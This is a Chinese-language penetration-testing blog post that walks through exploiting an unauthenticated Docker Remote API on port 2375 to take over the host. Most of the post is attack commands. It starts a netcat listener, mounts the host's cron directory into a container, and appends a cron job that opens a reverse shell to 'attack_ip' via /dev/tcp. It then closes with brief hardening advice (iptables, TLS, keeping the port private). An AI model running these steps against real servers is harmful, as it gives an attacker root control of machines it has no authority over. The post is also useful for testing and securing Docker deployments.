---
title: Docker Remote API 未授权访问漏洞利用
date: 2020-05-23 18:10:23
index_img: /img/docker.png
banner_img: /img/docker.png
tags:
  -  安全
categories:
  - 渗透测试 
---

#### 漏洞简介及危害
Docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的LINUX机器上，也可以实现虚拟化。 Docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，由docker官方提供。

Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。Docker Remote API如配置不当可导致未授权访问，攻击者利用 docker client 或者 http 直接请求就可以访问这个 API，可能导致敏感信息泄露，黑客也可以删除Docker上的数据。 攻击者可进一步利用Docker自身特性，直接访问宿主机上的敏感信息，或对敏感文件进行修改，最终完全控制服务器。

#### 漏洞利用
##### 环境
```
# 靶机IP/端口
172.19.101.34 2375
# 操作系统
linux_x86
```
##### 未授权访问测试
```
docker -H tcp://172.19.101.34:2375 images

# 返回镜像信息，漏洞存在

```
##### 反弹shell
```
# 在攻击主机上打开8088端口监听
[root@]# nc -vv -l -p 8088
```
##### 写入shell

创建容器，利用bash和crontab计划任务向宿主机写入shell，centos系统挂载路径为。 /var/spool/cron/root；ubuntu系统为/var/spool/cron/crontabs/root；
```
# 查看宿主机可用镜像
docker -H tcp://172.19.101.34:2375 images

# 选择合适镜像创建容器
docker -H tcp://172.19.101.34:2375 run -it -v /var/spool/cron/:/var/spool/cron/ image_id /bin/bash

# 启动刚刚创建的容器并连接
docker -H tcp://172.19.101.34:2375 start ct_id
docker -H tcp://172.19.101.34:2375 exec -it --user root ct_id /bin/bash

# 执行shell反弹命令
root@bfd2539dfdc8:/# echo '* * * * * bash -i >& /dev/tcp/attack_ip/8088 0>&1' >> /var/spool/cron/root
```
##### 成功反弹宿主机shell
![image](/img/docker_res.png)

> P.S ，测试完记得删掉存在漏洞的容器
#### 修复建议
临时解决方案：

1、对2375端口做网络访问控制，如设置iptables策略仅允许指定的IP来访问Docker接口；

2、修改docker swarm的认证方式，使用TLS认证：Overview Swarm with TLS 和 Configure Docker Swarm for TLS这两篇文档，说的是配置好TLS后，Docker CLI 在发送命令到docker daemon之前，会首先发送它的证书，如果证书是由daemon信任的CA所签名的，才可以继续执行。

**总之、不要将端口直接暴露在公网，内网中使用需要设置严格的访问规则，并使用TLS。**

[🔗知乎链接](https://zhuanlan.zhihu.com/p/142798377)
